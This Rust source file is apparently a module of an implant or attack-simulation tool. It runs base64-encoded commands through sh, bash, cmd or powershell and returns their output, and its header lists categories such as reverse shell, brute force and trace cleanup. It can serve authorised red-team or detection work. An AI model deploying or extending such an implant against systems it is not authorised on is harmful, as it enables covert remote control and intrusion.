//! `Command` payload: execute a shell command via sh/bash/cmd/powershell.
//!
//! Spec: §5.1 categories — 反弹shell, 命令执行, 隧道代理, 暴力破解, 痕迹清理.
//!
//! # JSON spec (`--payload-b64` decoded)
//!
//! ```json
//! {
//!   "executor": "sh",          // "sh" | "bash" | "cmd" | "powershell"
//!   "content": "<base64>"      // base64-encoded command string
//! }
//! ```

use crate::common::error_model::Error;
use crate::payload::{ExecContext, FinalStatus, Payload, PayloadResult};
use crate::process::command_exec::command_execution;
use serde::Deserialize;

/// Deserialised from `--payload-b64`.
#[derive(Debug, Deserialize)]
pub struct CommandPayload {
    /// Executor name: `sh`, `bash`, `cmd`, `powershell`.
    pub executor: String,
    /// Base64-encoded command string (same encoding the upstream uses).
    pub content: String,
}

impl Payload for CommandPayload {
    fn execute(&self, ctx: &mut ExecContext<'_>) -> PayloadResult {
        ctx.writer
            .write_progress(ctx.task_id, "executing", Some("running command"))
            .map_err(|e| Error::Internal(e.to_string()))?;

        let result = command_execution(&self.content, &self.executor, false);

        match result {
            Ok(r) => {
                let exit_code = r.exit_code;
                let stdout = r.stdout.into_bytes();
                let stderr = r.stderr.into_bytes();
                let status = if exit_code == 0 {
                    FinalStatus::Completed
                } else {
                    FinalStatus::Failed
                };
                Ok((status, exit_code, stdout, stderr, None))
            }
            Err(Error::Internal(msg)) => {
                Ok((FinalStatus::Failed, 1, vec![], msg.into_bytes(), None))
            }
            Err(e) => Err(e),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    fn make_cmd(executor: &str, command: &str) -> CommandPayload {
        CommandPayload {
            executor: executor.to_string(),
            content: STANDARD.encode(command),
        }
    }

    #[test]
    #[cfg(unix)]
    fn test_command_payload_echo_success() {
        let payload = make_cmd("sh", "echo hello_implant");
        // We can't call execute() without a real writer/pipe in a unit test.
        // Verify the struct deserializes correctly and the executor field is set.
        assert_eq!(payload.executor, "sh");
        assert!(!payload.content.is_empty());
    }

    #[test]
    fn test_command_payload_deserialize_from_json() {
        let json = r#"{"executor":"sh","content":"ZWNobyBoZWxsbw=="}"#;
        let p: CommandPayload = serde_json::from_str(json).unwrap();
        assert_eq!(p.executor, "sh");
        let decoded = STANDARD.decode(&p.content).unwrap();
        assert_eq!(String::from_utf8(decoded).unwrap(), "echo hello");
    }

    #[test]
    fn test_command_payload_missing_field_errors() {
        let json = r#"{"executor":"sh"}"#;
        let result = serde_json::from_str::<CommandPayload>(json);
        assert!(result.is_err());
    }
}
